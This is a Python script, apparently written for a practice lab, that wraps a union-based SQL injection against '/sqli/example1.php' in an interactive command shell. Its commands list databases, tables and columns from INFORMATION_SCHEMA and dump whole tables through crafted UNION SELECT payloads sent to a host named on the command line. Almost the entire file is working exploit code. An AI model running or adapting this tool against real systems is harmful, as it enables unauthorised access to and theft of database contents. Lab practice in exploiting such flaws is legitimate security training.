from bs4 import BeautifulSoup
from cmd import Cmd
from tabulate import tabulate
import requests
import sys


class MyPrompt(Cmd):
    prompt = 'lab2sqli> '
    intro = "Type ? to list commands"

    def get_columns(self, args):
        ip_addr = sys.argv[1]
        request = requests.get(
            f"http://{ip_addr}/sqli/example1.php?name=%27%20union%20select%201,group_concat(COLUMN_NAME),3,4,5%20from%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_SCHEMA=%27{str(args).split(' ')[0]}%27%20AND%20TABLE_NAME=%27{str(args).split(' ')[1]}%27%23")
        soup = BeautifulSoup(request.content, "html.parser")
        return soup.find_all("tr")[1].find_all("td")[1].text

    @staticmethod
    def do_exit(self):
        """Exit the application."""
        print("Bye")
        return True

    @staticmethod
    def do_dbs(self):
        ip_addr = sys.argv[1]
        request = requests.get(f"http://{ip_addr}/sqli/example1.php?name=%27%20union%20select%201,group_concat(SCHEMA_NAME),3,4,5%20from%20INFORMATION_SCHEMA.SCHEMATA%23")
        soup = BeautifulSoup(request.content, "html.parser")
        dbs = soup.find_all("tr")[1].find_all("td")[1].text.split(',')
        db_table = []
        for x in dbs:
            x = x.split(',')
            db_table.append(x)
        print("\n"
              f"{tabulate(db_table, headers=['Databases'])}\n")

    def help_dbs(self):
        print("List databases.")

    def do_tables(self, db_name):
        ip_addr = sys.argv[1]
        request = requests.get(f"http://{ip_addr}/sqli/example1.php?name=%27%20union%20select%201,group_concat(TABLE_NAME),3,4,5%20from%20INFORMATION_SCHEMA.TABLES%20WHERE%20TABLE_SCHEMA=%27{db_name}%27%23")
        soup = BeautifulSoup(request.content, "html.parser")
        tables = soup.find_all("tr")[1].find_all("td")[1].text.split(',')
        tables_table = []
        for x in tables:
            x = x.split(',')
            tables_table.append(x)
        print("\n"
              f"{tabulate(tables_table, headers=['Tables'])}\n");

    def help_tables(self):
        print("List tables for database.\n"
              "Use: tables <database>")

    def do_columns(self, args):
        columns = self.get_columns(args).split(',')
        columns_table = []
        for x in columns:
            x = x.split(',')
            columns_table.append(x)
        print("\n"
              f"{tabulate(columns_table, headers=['Columns'])}\n")

    def help_columns(self):
        print("List columns for table in database.\n"
              "Use: columns <database> <table>")

    def do_dump(self, args):
        ip_addr = sys.argv[1]
        cols = self.get_columns(args)
        columns = cols.replace(",", ",%20+%20%27%20|%20%27,%20")
        request = requests.get(f"http://{ip_addr}/sqli/example1.php?name=%27%20union%20select%201,group_concat({columns}),3,4,5%20from%20{str(args).split(' ')[0]}.{str(args).split(' ')[1]}%23")
        soup = BeautifulSoup(request.content, "html.parser")
        data = soup.find_all("tr")[1].find_all("td")[1].text.split(',')
        data_table = []
        for x in data:
            x = x.split('|')
            data_table.append(x)
        print("\n"
              f"{tabulate(data_table, headers=cols.split(','))}\n")

    def help_dump(self):
        print("Dump data from table.\n"
              "Use: dump <database> <table>")


MyPrompt().cmdloop()
